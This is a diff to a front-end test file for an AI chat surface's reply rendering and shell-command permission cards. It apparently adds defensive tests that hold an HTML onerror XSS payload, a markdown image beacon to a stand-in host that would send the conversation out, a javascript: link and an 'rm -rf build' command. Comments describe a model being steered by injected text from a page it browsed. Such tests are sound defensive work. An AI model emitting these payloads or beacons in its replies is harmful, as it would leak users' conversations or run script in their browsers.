@@ -130,6 +130,9 @@ function card(overrides: Partial<CompanionDecision> = {}): CompanionDecision {
 
 const roots: Root[] = [];
 
+/** Every thread the component handed back, so the decided-card refresh can be observed. */
+let threads: Thread[] = [];
+
 function mount(value: Thread) {
   const container = document.createElement("div");
   document.body.appendChild(container);
@@ -142,7 +145,7 @@ function mount(value: Thread) {
       orgId: "org-1",
       busy: false,
       onSend: async () => true,
-      onThread: () => {},
+      onThread: (next: Thread) => threads.push(next),
     }));
   });
   return container;
@@ -161,6 +164,8 @@ function click(target: Element) {
 
 beforeEach(() => {
   decide.mockClear();
+  decide.mockImplementation(async () => nextThread);
+  threads = [];
 });
 
 afterEach(() => {
@@ -189,6 +194,48 @@ describe("a Companion turn's reasoning", () => {
     const container = mount(thread([entry({ content: "2025" })]));
 
     expect(container.querySelector("[data-slot='reasoning-trigger']")).toBeNull();
+  });
+});
+
+describe("a Companion reply as markdown", () => {
+  it("renders the structure Pi wrote", () => {
+    const container = mount(thread([
+      entry({ content: "## Incident\n\n- one\n- two\n\n```bash\nls -la\n```" }),
+    ]));
+
+    expect(container.querySelector("h2")?.textContent).toBe("Incident");
+    expect(container.querySelectorAll("li")).toHaveLength(2);
+    expect(container.querySelector("pre code")?.textContent).toContain("ls -la");
+  });
+
+  it("keeps markup a model wrote as text instead of as elements", () => {
+    // A reply is model output, and a model can be told what to say by a page it browsed. Raw HTML
+    // must never become part of this document.
+    const container = mount(thread([
+      entry({ content: "<img src=x onerror=alert(1)> and <b>bold</b>" }),
+    ]));
+
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("b")).toBeNull();
+    expect(container.textContent).toContain("<img src=x onerror=alert(1)>");
+  });
+
+  it("never fetches an image a reply asked for", () => {
+    // `![](https://elsewhere/?d=…)` would send the conversation to whoever wrote it, with no click
+    // and no way for the reader to know. The description stands in for the image instead.
+    const container = mount(thread([
+      entry({ content: "![the leak](https://example.invalid/beacon?d=secret)" }),
+    ]));
+
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.innerHTML).not.toContain("example.invalid");
+    expect(container.textContent).toContain("[image: the leak]");
+  });
+
+  it("refuses a javascript: link", () => {
+    const container = mount(thread([entry({ content: "[click](javascript:alert(1))" })]));
+
+    expect(container.querySelector("a")?.getAttribute("href") ?? "").not.toContain("javascript:");
   });
 });
 
@@ -263,6 +310,28 @@ describe("a permission card in the thread", () => {
     });
 
     expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-1", { action: "allow" });
+    // The thread the control plane answered with goes straight back to the surface, so the card
+    // leaves `pending` on the spot rather than at the next poll.
+    expect(threads).toEqual([nextThread]);
+  });
+
+  it("sends one decision even when Allow is pressed twice before it settles", async () => {
+    // This is the control that unblocks a shell command inside the Box. Pressing it twice must not
+    // ask twice.
+    let settle: (thread: Thread) => void = () => {};
+    decide.mockImplementation(() => new Promise<Thread>((resolve) => { settle = resolve; }));
+    const container = mount(thread([
+      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
+    ]));
+    const allow = buttonNamed(container, "Allow")!;
+
+    click(allow);
+    click(allow);
+    await act(async () => {
+      settle(nextThread);
+    });
+
+    expect(decide).toHaveBeenCalledTimes(1);
   });
 
   it("sends a Deny the same way", async () => {
@@ -336,7 +405,7 @@ describe("a permission card in the thread", () => {
       }),
     ]));
 
-    expect(container.textContent).toContain("Timed out — denied");
+    expect(container.textContent).toContain("Timed out, denied");
     expect(buttonNamed(container, "Allow")).toBeUndefined();
   });
 
